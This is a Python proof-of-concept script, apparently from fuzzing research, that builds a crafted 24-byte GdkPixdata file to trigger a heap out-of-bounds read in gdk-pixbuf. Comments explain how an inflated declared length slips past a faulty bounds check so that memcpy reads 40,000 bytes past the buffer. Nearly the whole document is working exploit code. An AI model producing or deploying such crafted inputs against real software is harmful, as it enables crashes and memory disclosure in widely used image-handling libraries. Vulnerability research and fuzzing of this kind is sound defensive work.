import struct, os

POC_DIR = "/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf-csource_c"

MAGIC = 0x47646b50  # "GdkP"

# Use RGBA + SAMPLE_WIDTH_8 + RAW (not RLE) for reliable memcpy OOB
# GDK_PIXDATA_COLOR_TYPE_RGBA   = 0x02
# GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16 = 0x010000
# GDK_PIXDATA_ENCODING_RAW      = 0x01 << 24 = 0x01000000
PIXDATA_TYPE_RGBA_RAW = 0x02 | 0x010000 | 0x01000000  # = 0x01010002

# Use a large image so the subsequent memcpy reads far past the 24-byte buffer.
# gdk_pixbuf_from_pixdata (RAW path):
#   memcpy(data, pixel_data, rowstride * height)
# pixel_data = stream + 24 (points just past the 24-byte header-only file).
# Reading rowstride * height = 400 * 100 = 40000 bytes from that address
# blows far past whatever GString allocates -> ASAN heap-buffer-overflow-read.
width = 100
height = 100
bpp = 4         # RGBA
rowstride = width * bpp  # = 400

# K = 24 (maximum bypass window): declare length = 48 (header 24 + 24 phantom bytes)
# but actual file is only 24 bytes (header only).
# Buggy check: stream_length(24) < pixdata->length(48) - 24 = 24 -> FALSE -> passes!
# Correct check: stream_length(24) < pixdata->length(48) = 48 -> TRUE -> would reject.
declared_length = 48

header = struct.pack(">IIIIII",
    MAGIC,
    declared_length,           # LIES: claims 24 extra bytes of pixel_data exist
    PIXDATA_TYPE_RGBA_RAW,     # RGBA, 8-bit samples, raw (no RLE)
    rowstride,                 # 400 bytes per row
    width,                     # 100
    height,                    # 100
)

# No pixel_data bytes - file stops after header
data = header   # exactly 24 bytes

outpath = os.path.join(POC_DIR, "vuln_003.gdkp")
with open(outpath, "wb") as f:
    f.write(data)
print(f"Generated {outpath} ({len(data)} bytes, "
      f"declared_length={declared_length}, "
      f"image={width}x{height} RGBA raw, "
      f"expected_pixel_data={rowstride * height} bytes)")
print(f"Attack: stream_length={len(data)} < declared({declared_length})-24={declared_length-24} -> "
      f"FALSE (bug bypassed) -> memcpy reads {rowstride*height} bytes past end!")
